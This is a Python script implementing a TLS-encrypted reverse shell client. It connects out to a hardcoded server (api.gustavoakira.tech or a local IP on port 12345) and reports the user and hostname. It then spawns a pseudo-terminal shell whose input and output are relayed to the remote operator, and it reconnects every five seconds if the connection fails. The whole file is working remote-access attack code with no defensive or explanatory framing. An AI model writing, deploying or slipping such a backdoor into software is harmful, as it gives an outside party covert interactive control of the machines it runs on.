import socket
import subprocess
import json
import time
import ssl
import os
import pty
import select
import fcntl
import termios
import base64
import struct

# --- CONFIGURATION ---
# Set to True to use FQDN/public CA mode (Let's Encrypt, etc.)
USE_FQDN = True

# If using FQDN mode, set the FQDN here (e.g., 'shell.gustavoakira.tech')
SERVER_FQDN = 'api.gustavoakira.tech'
# If using self-signed mode, set the IP and cert file
SERVER_IP = '192.168.0.132'
CA_CERTFILE = 'server.crt'
SERVER_PORT = 12345

# --- END CONFIGURATION ---

def send_message(sock, message):
    """Sends a JSON message to the specified socket."""
    serialized_message = json.dumps(message).encode('utf-8')
    message_length = str(len(serialized_message)).zfill(64).encode('utf-8')
    sock.sendall(message_length + serialized_message)

def start_client():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            if USE_FQDN:
                # Use system CA store, verify FQDN
                context = ssl.create_default_context()
                secure_client_socket = context.wrap_socket(
                    client_socket, server_hostname=SERVER_FQDN
                )
                connect_host = SERVER_FQDN
            else:
                # Use self-signed cert
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.load_verify_locations(CA_CERTFILE)
                context.verify_mode = ssl.CERT_REQUIRED
                context.check_hostname = False
                secure_client_socket = context.wrap_socket(
                    client_socket, server_hostname=SERVER_IP
                )
                connect_host = SERVER_IP

            secure_client_socket.connect((connect_host, SERVER_PORT))
            print(f"[*] Connected securely to server {connect_host}:{SERVER_PORT}")

            # Send client hostname and username to the server
            try:
                hostname_info = subprocess.run(
                    "echo $(whoami)@$(hostname)", shell=True, capture_output=True, text=True
                ).stdout.strip()
                send_message(secure_client_socket, {'type': 'info', 'hostname': hostname_info})
            except Exception as e:
                print(f"[-] Error sending hostname info: {e}")

            # Fork a child process to create a pseudo-terminal
            pid, master_fd = pty.fork()
            if pid == 0:
                # Child process: spawn a shell
                shell = os.environ.get('SHELL', 'sh')
                os.execv(shell, [shell])
            else:
                # Parent process: handle communication
                while True:
                    try:
                        # Use select to wait for data from the socket or the PTY
                        r, w, e = select.select([secure_client_socket, master_fd], [], [])

                        if secure_client_socket in r:
                            # Data from server -> write to PTY
                            message_length_raw = secure_client_socket.recv(64)
                            if not message_length_raw:
                                break
                            message_length = int(message_length_raw.decode('utf-8').strip())
                            message_raw = secure_client_socket.recv(message_length)
                            if not message_raw:
                                break
                            
                            data = json.loads(message_raw.decode('utf-8'))

                            if data['type'] == 'pty_input':
                                pty_input = base64.b64decode(data['data'])
                                os.write(master_fd, pty_input)
                            elif data['type'] == 'resize':
                                # Resize the PTY
                                rows, cols = data['rows'], data['cols']
                                fcntl.ioctl(master_fd, termios.TIOCSWINSZ, struct.pack('HHHH', rows, cols, 0, 0))

                        if master_fd in r:
                            # Data from PTY -> send to server
                            pty_output = os.read(master_fd, 1024)
                            if pty_output:
                                encoded_output = base64.b64encode(pty_output).decode('utf-8')
                                send_message(secure_client_socket, {'type': 'pty_output', 'data': encoded_output})
                            else:
                                # PTY closed (shell exited)
                                break

                    except (BrokenPipeError, OSError):
                        break
                    except Exception as e:
                        print(f"[-] Error during PTY communication: {e}")
                        break

        except ConnectionRefusedError:
            print(f"[-] Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except ssl.SSLError as e:
            print(f"[-] SSL Handshake failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[-] An unexpected error occurred: {e}. Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    start_client()
